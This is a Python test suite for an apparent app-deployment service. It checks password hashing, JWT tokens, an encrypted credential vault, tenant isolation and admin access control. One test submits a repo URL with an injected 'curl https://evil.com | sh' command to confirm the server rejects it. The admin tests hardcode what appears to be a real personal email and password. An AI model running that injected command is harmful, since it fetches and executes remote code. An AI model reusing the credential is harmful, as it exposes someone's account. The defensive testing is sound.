"""
Automated Security, Authentication & Multi-Tenancy Tests for AutoDevOps.
Tests bcrypt password hashing, JWT signing/verification, Fernet AES-256 encryption,
FastAPI auth endpoints, vault endpoints, and strict multi-tenant isolation.
"""

import os
import sys
import pytest
from pathlib import Path

# Add backend to path
BACKEND_DIR = Path(__file__).resolve().parent.parent / "backend"
sys.path.insert(0, str(BACKEND_DIR))

# Use an isolated temporary database for testing
os.environ["DB_PATH"] = str(Path(__file__).resolve().parent / "test_security.sqlite3")
os.environ["JWT_SECRET_KEY"] = "test-jwt-secret-key-1234567890"

import auth
import crypto
import models
from fastapi.testclient import TestClient
from main import app


@pytest.fixture(autouse=True)
def setup_teardown_db():
    """Recreate clean test database before each test."""
    test_db = Path(os.environ["DB_PATH"])
    if test_db.exists():
        test_db.unlink()
    # Re-initialize database tables
    models.init_db()
    yield
    if test_db.exists():
        try:
            test_db.unlink()
        except OSError:
            pass


# ── 1. Cryptography & Password Security Tests ─────────────────────────────────

class TestCryptoAndPasswords:
    def test_bcrypt_hashing_and_verification(self):
        plain = "SuperSecureP@ssw0rd123"
        pw_hash = auth.hash_password(plain)

        assert pw_hash != plain
        assert pw_hash.startswith("$2b$")
        assert auth.verify_password(plain, pw_hash) is True
        assert auth.verify_password("WrongPassword123", pw_hash) is False

    def test_jwt_token_creation_and_decoding(self):
        user_data = {"sub": "user-uuid-123", "email": "test@example.com"}
        token = auth.create_access_token(user_data)

        assert isinstance(token, str)
        payload = auth.decode_access_token(token)
        assert payload is not None
        assert payload["sub"] == "user-uuid-123"
        assert payload["email"] == "test@example.com"
        assert "exp" in payload

    def test_fernet_credential_encryption_and_decryption(self):
        raw_secret = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
        encrypted = crypto.encrypt_secret(raw_secret)

        # Ciphertext must not match plaintext
        assert encrypted != raw_secret
        assert len(encrypted) > 20

        decrypted = crypto.decrypt_secret(encrypted)
        assert decrypted == raw_secret

    def test_access_key_masking(self):
        assert crypto.mask_access_key("AKIAIOSFODNN7EXAMPLE") == "AKIA••••••••MPLE"
        assert crypto.mask_access_key("SHORT") == "••••••••"
        assert crypto.mask_access_key("") == ""


# ── 2. Database Models & Vault Tests ──────────────────────────────────────────

class TestModelsAndVault:
    def test_user_creation_and_lookup(self):
        pw_hash = auth.hash_password("password123")
        user = models.create_user("alice@domain.com", pw_hash)

        assert user["id"] is not None
        assert user["email"] == "alice@domain.com"

        fetched = models.get_user_by_email("alice@domain.com")
        assert fetched is not None
        assert fetched["id"] == user["id"]
        assert auth.verify_password("password123", fetched["password_hash"])

        profile = models.get_user_by_id(user["id"])
        assert profile is not None
        assert profile["email"] == "alice@domain.com"
        assert "password_hash" not in profile

    def test_vault_credentials_save_and_retrieve(self):
        user = models.create_user("bob@domain.com", auth.hash_password("password123"))

        # Save credentials in encrypted vault
        res = models.save_user_credentials(user["id"], "AKIA1111222233334444", "SecretKey1234567890Abc")
        assert res["configured"] is True
        assert res["masked_key"] == "AKIA••••••••4444"

        # Check status (safe for UI)
        status = models.get_user_credentials_status(user["id"])
        assert status["configured"] is True
        assert status["masked_key"] == "AKIA••••••••4444"

        # Decrypt for internal execution
        creds = models.get_user_credentials(user["id"])
        assert creds is not None
        assert creds["aws_key"] == "AKIA1111222233334444"
        assert creds["aws_secret"] == "SecretKey1234567890Abc"

        # Delete from vault
        deleted = models.delete_user_credentials(user["id"])
        assert deleted is True
        assert models.get_user_credentials(user["id"]) is None


# ── 3. Multi-Tenant VM Isolation Tests ────────────────────────────────────────

class TestMultiTenantIsolation:
    def test_user_a_cannot_see_user_b_apps(self):
        user_a = models.create_user("user_a@domain.com", auth.hash_password("pw12345678"))
        user_b = models.create_user("user_b@domain.com", auth.hash_password("pw12345678"))

        # User A deploys two apps
        models.save_app("app-a1", "https://github.com/a/repo1", "http://1.1.1.1", "i-0aaa111", user_id=user_a["id"])
        models.save_app("app-a2", "https://github.com/a/repo2", "http://1.1.1.2", "i-0aaa222", user_id=user_a["id"])

        # User B deploys one app
        models.save_app("app-b1", "https://github.com/b/repo1", "http://2.2.2.1", "i-0bbb111", user_id=user_b["id"])

        # Fetch apps for User A
        apps_a = models.get_apps_by_user(user_a["id"])
        assert len(apps_a) == 2
        app_ids_a = [a[0] for a in apps_a]
        assert "app-a1" in app_ids_a
        assert "app-a2" in app_ids_a
        assert "app-b1" not in app_ids_a  # User B's app MUST NOT be in User A's list!

        # Fetch apps for User B
        apps_b = models.get_apps_by_user(user_b["id"])
        assert len(apps_b) == 1
        assert apps_b[0][0] == "app-b1"
        assert "app-a1" not in [b[0] for b in apps_b]

    def test_ownership_validation_on_instance(self):
        user_a = models.create_user("owner@domain.com", auth.hash_password("pw12345678"))
        user_b = models.create_user("attacker@domain.com", auth.hash_password("pw12345678"))

        models.save_app("app-x", "https://github.com/owner/repo", "http://3.3.3.3", "i-0victim999", user_id=user_a["id"])

        # Owner lookup succeeds
        assert models.get_app_by_instance("i-0victim999", user_id=user_a["id"]) is not None

        # Attacker lookup with user_b id returns None
        assert models.get_app_by_instance("i-0victim999", user_id=user_b["id"]) is None


# ── 4. FastAPI Endpoints & Integration Tests ──────────────────────────────────

class TestAPIEndpoints:
    def test_register_and_login_flow(self):
        client = TestClient(app)

        # Register
        res = client.post("/api/auth/register", json={
            "email": "dev@company.com",
            "password": "Password123!"
        })
        assert res.status_code == 201
        data = res.json()
        assert "token" in data
        assert data["user"]["email"] == "dev@company.com"

        # Duplicate registration rejected
        dup_res = client.post("/api/auth/register", json={
            "email": "dev@company.com",
            "password": "Password123!"
        })
        assert dup_res.status_code == 400

        # Login
        login_res = client.post("/api/auth/login", json={
            "email": "dev@company.com",
            "password": "Password123!"
        })
        assert login_res.status_code == 200
        token = login_res.json()["token"]

        # Authenticated /me
        me_res = client.get("/api/auth/me", headers={"Authorization": f"Bearer {token}"})
        assert me_res.status_code == 200
        assert me_res.json()["user"]["email"] == "dev@company.com"

    def test_protected_apps_endpoint_requires_auth(self):
        client = TestClient(app)

        # Unauthenticated request returns 401
        res = client.get("/apps")
        assert res.status_code == 401

    def test_idor_protection_on_instance_delete(self):
        client = TestClient(app)

        # Register User 1
        res1 = client.post("/api/auth/register", json={"email": "u1@test.com", "password": "Password123!"})
        token1 = res1.json()["token"]
        assert token1
        u1_id = res1.json()["user"]["id"]

        # Register User 2
        res2 = client.post("/api/auth/register", json={"email": "u2@test.com", "password": "Password123!"})
        token2 = res2.json()["token"]

        # User 1 has an instance
        models.save_app("app-u1", "https://github.com/u1/repo", "http://4.4.4.4", "i-0owner12345", user_id=u1_id)

        # User 2 tries to delete User 1's instance -> MUST return 403 Forbidden!
        del_res = client.delete("/delete/i-0owner12345", headers={"Authorization": f"Bearer {token2}"})
        assert del_res.status_code == 403
        assert "Forbidden" in del_res.json()["detail"]

    def test_github_webhook_endpoint(self):
        client = TestClient(app)

        # Create user and app with nodejs runtime
        user = models.create_user("webhook_user@test.com", auth.hash_password("Password123!"))
        models.save_app(
            "app-hook1",
            "https://github.com/webhook/test",
            "http://5.5.5.5",
            "i-0hook123",
            user_id=user["id"],
            app_type="nodejs"
        )

        # Trigger webhook push
        payload = {
            "ref": "refs/heads/main",
            "head_commit": {
                "message": "fix: update production routes"
            }
        }
        res = client.post("/api/webhooks/github/app-hook1", json=payload)
        assert res.status_code == 200
        data = res.json()
        assert data["status"] == "accepted"
        assert data["app_id"] == "app-hook1"
        assert "update production routes" in data["commit"]

        # Verify status was updated to REDEPLOYING
        app_record = models.get_app_by_id("app-hook1")
        assert app_record["status"] == "REDEPLOYING"
        assert app_record["app_type"] == "nodejs"

        # Webhook for non-existent app returns 404
        not_found = client.post("/api/webhooks/github/non-existent-app-999", json=payload)
        assert not_found.status_code == 404

    def test_metrics_endpoint_with_auth_and_ownership(self):
        client = TestClient(app)

        # 1. Unauthenticated request must return 401
        res = client.get("/api/metrics/i-0owner123")
        assert res.status_code == 401

        # 2. Setup User A (owner) and User B (attacker)
        user_a = models.create_user("owner@test.com", auth.hash_password("Password123!"))
        token_a = auth.create_access_token({"sub": user_a["id"], "email": user_a["email"]})
        models.save_app("app-a", "https://github.com/owner/repo", "http://1.1.1.1", "i-0owner123", user_id=user_a["id"])

        user_b = models.create_user("attacker@test.com", auth.hash_password("Password123!"))
        token_b = auth.create_access_token({"sub": user_b["id"], "email": user_b["email"]})

        # 3. User B attempting to query User A instance metrics must be rejected (403 Forbidden)
        res_b = client.get(
            "/api/metrics/i-0owner123",
            headers={"Authorization": f"Bearer {token_b}"}
        )
        assert res_b.status_code == 403
        assert "Forbidden" in res_b.json()["detail"]

        # 4. User A querying their own instance metrics must succeed (200 OK)
        res_a = client.get(
            "/api/metrics/i-0owner123",
            headers={"Authorization": f"Bearer {token_a}"}
        )
        assert res_a.status_code == 200
        m = res_a.json()
        assert m["instance_id"] == "i-0owner123"
        assert "cpu_percent" in m
        assert "ram_percent" in m
        assert "sparklines" in m
        assert len(m["sparklines"]["cpu"]) == 7
        assert len(m["sparklines"]["ram"]) == 7
        assert len(m["sparklines"]["network"]) == 7

    def test_deploy_endpoint_rejects_placeholder_credentials(self):
        client = TestClient(app)
        reg = client.post("/api/auth/register", json={"email": "deployer@test.com", "password": "Password123!"})
        token = reg.json()["token"]

        res = client.post(
            "/deploy",
            headers={"Authorization": f"Bearer {token}"},
            json={
                "repo_url": "https://github.com/tiangolo/fastapi",
                "app_type": "python",
                "aws_key": "AKIAIOSFODNN7EXAMPLE",
                "aws_secret": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
            }
        )
        assert res.status_code == 400
        assert "Placeholder" in res.json()["detail"] or "invalid" in res.json()["detail"].lower()

    def test_deploy_endpoint_rejects_malicious_or_invalid_repo_url(self):
        client = TestClient(app)
        reg = client.post("/api/auth/register", json={"email": "safety@test.com", "password": "Password123!"})
        token = reg.json()["token"]

        # Test command injection attempt
        injection_res = client.post(
            "/deploy",
            headers={"Authorization": f"Bearer {token}"},
            json={
                "repo_url": "https://github.com/user/repo; curl https://evil.com | sh",
                "app_type": "python",
                "aws_key": "AKIA1111222233334444",
                "aws_secret": "SecretKey1234567890Abc",
            }
        )
        assert injection_res.status_code == 400
        assert "Invalid GitHub repository URL" in injection_res.json()["detail"]

        # Test non-GitHub URL
        gitlab_res = client.post(
            "/deploy",
            headers={"Authorization": f"Bearer {token}"},
            json={
                "repo_url": "https://gitlab.com/user/repo",
                "app_type": "python",
                "aws_key": "AKIA1111222233334444",
                "aws_secret": "SecretKey1234567890Abc",
            }
        )
        assert gitlab_res.status_code == 400

    def test_delete_endpoint_requires_credentials_when_vault_empty(self):
        client = TestClient(app)
        reg = client.post("/api/auth/register", json={"email": "delcheck@test.com", "password": "Password123!"})
        token = reg.json()["token"]
        uid = reg.json()["user"]["id"]

        models.save_app("app-delcheck", "https://github.com/test/repo", "http://9.9.9.9", "i-0delcheck123", user_id=uid)

        # Attempt to delete without vault keys or payload keys
        del_res = client.delete("/delete/i-0delcheck123", headers={"Authorization": f"Bearer {token}"})
        assert del_res.status_code == 400
        assert "AWS credentials required to terminate" in del_res.json()["detail"]

    def test_download_ssh_key_endpoint(self):
        client = TestClient(app)

        # 1. Unauthenticated request rejected
        unauth = client.get("/api/apps/app-ssh1/ssh-key")
        assert unauth.status_code == 401

        # 2. Setup User A (owner) and User B (attacker)
        user_a = models.create_user("ssh_owner@test.com", auth.hash_password("Password123!"))
        token_a = auth.create_access_token({"sub": user_a["id"], "email": user_a["email"]})

        user_b = models.create_user("ssh_attacker@test.com", auth.hash_password("Password123!"))
        token_b = auth.create_access_token({"sub": user_b["id"], "email": user_b["email"]})

        sample_pem = "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0\n-----END RSA PRIVATE KEY-----"
        models.save_app(
            "app-ssh1",
            "https://github.com/test/repo",
            "http://1.2.3.4",
            "i-0sshkeytest",
            user_id=user_a["id"],
            ssh_key=sample_pem
        )

        # 3. User B cannot download User A's SSH key (403 Forbidden)
        res_b = client.get("/api/apps/app-ssh1/ssh-key", headers={"Authorization": f"Bearer {token_b}"})
        assert res_b.status_code == 403

        # 4. Owner downloads decrypted SSH key (200 OK)
        res_a = client.get("/api/apps/app-ssh1/ssh-key", headers={"Authorization": f"Bearer {token_a}"})
        assert res_a.status_code == 200
        assert res_a.text == sample_pem
        assert 'attachment; filename="key-app-ssh1.pem"' in res_a.headers["content-disposition"]


# ── 5. Admin Privileges, Database Inspection & Audit Tests ────────────────────

class TestAdminEndpointsAndAudit:
    def test_admin_seed_and_login(self):
        client = TestClient(app)

        # Seed admin
        admin = models.seed_admin_user("vanshg247776@gmail.com", "vansh@20012006")
        assert admin["email"] == "vanshg247776@gmail.com"
        assert admin["is_admin"] == 1

        # Login with admin credentials
        login_res = client.post("/api/auth/login", json={
            "email": "vanshg247776@gmail.com",
            "password": "vansh@20012006"
        })
        assert login_res.status_code == 200
        data = login_res.json()
        assert "token" in data
        assert data["user"]["is_admin"] == 1

    def test_admin_overview_and_data_access(self):
        client = TestClient(app)
        models.seed_admin_user("vanshg247776@gmail.com", "vansh@20012006")

        login_res = client.post("/api/auth/login", json={
            "email": "vanshg247776@gmail.com",
            "password": "vansh@20012006"
        })
        token = login_res.json()["token"]
        headers = {"Authorization": f"Bearer {token}"}

        # Overview endpoint
        overview_res = client.get("/api/admin/overview", headers=headers)
        assert overview_res.status_code == 200
        overview = overview_res.json()
        assert "total_users" in overview
        assert "database" in overview
        assert overview["database"]["journal_mode"] == "WAL"

        # Users list endpoint
        users_res = client.get("/api/admin/users", headers=headers)
        assert users_res.status_code == 200
        assert isinstance(users_res.json()["users"], list)

        # Deployments endpoint
        deployments_res = client.get("/api/admin/deployments", headers=headers)
        assert deployments_res.status_code == 200
        assert isinstance(deployments_res.json()["deployments"], list)

        # Activity endpoint
        activity_res = client.get("/api/admin/activity", headers=headers)
        assert activity_res.status_code == 200
        assert isinstance(activity_res.json()["activities"], list)

        # DB Inspect endpoint
        db_res = client.get("/api/admin/db-inspect", headers=headers)
        assert db_res.status_code == 200
        assert "tables" in db_res.json()

    def test_regular_user_forbidden_from_admin_apis(self):
        client = TestClient(app)

        # Register normal non-admin user
        reg = client.post("/api/auth/register", json={
            "email": "regular_member@example.com",
            "password": "Password123!"
        })
        assert reg.status_code == 201
        token = reg.json()["token"]
        headers = {"Authorization": f"Bearer {token}"}

        # Verify all admin endpoints return 403 Forbidden
        for ep in ["/api/admin/overview", "/api/admin/users", "/api/admin/deployments", "/api/admin/activity", "/api/admin/db-inspect"]:
            res = client.get(ep, headers=headers)
            assert res.status_code == 403
            assert "Admin privileges required" in res.json()["detail"]

